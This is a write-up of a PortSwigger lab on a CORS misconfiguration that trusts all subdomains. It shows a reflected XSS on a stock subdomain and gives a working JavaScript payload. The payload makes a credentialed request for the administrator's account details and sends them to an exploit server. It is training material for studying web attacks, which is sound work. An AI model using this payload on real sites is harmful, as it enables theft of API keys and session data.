# [Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

## Lab

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

`/accountDetails` request:

```http
GET /accountDetails HTTP/1.1
Host: id.web-security-academy.net
Cookie: session=wienersession

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "zYZabyLpG8IgZRHD6ZIAZGTjUKnmHRG0",
  "sessions": [
    "TTgEGDPhvJS2DdXBX0EftVqCmVFivyzT"
  ]
}
```

add `Origin` header:

- `Origin: hacked` => failed
- `Origin: https://id.web-security-academy.net` => reflected in `Access-Control-Allow-Origin`
- `Origin: https://*.id.web-security-academy.net` => reflected in `Access-Control-Allow-Origin`

=> the website trusted all subdomain. if we find a xss vulnerability in any subdomain, we can use it to attack website.

use the `check stock` function at product page, we found that there is a subdomain `stock.id.web-security-academy.net`.

this subdomain is vulnerable to XSS:

```http
GET /?productId=<script>alert()</script>&storeId=1 HTTP/1.1
Host: stock.id.web-security-academy.net

HTTP/1.1 400 Bad Request
Content-Length: 58

<h4>ERROR</h4>Invalid product ID: <script>alert()</script>
```

## Solutions

exploit the xss from trusted subdomain to retrieve sensitive information.

craft a response at exploit-server:

- body:

  ```js
  <script>
      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
  </script>
  ```

deliver to victim and observe the apikey => solved

payload:

```js
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; 
  };
</script>
```
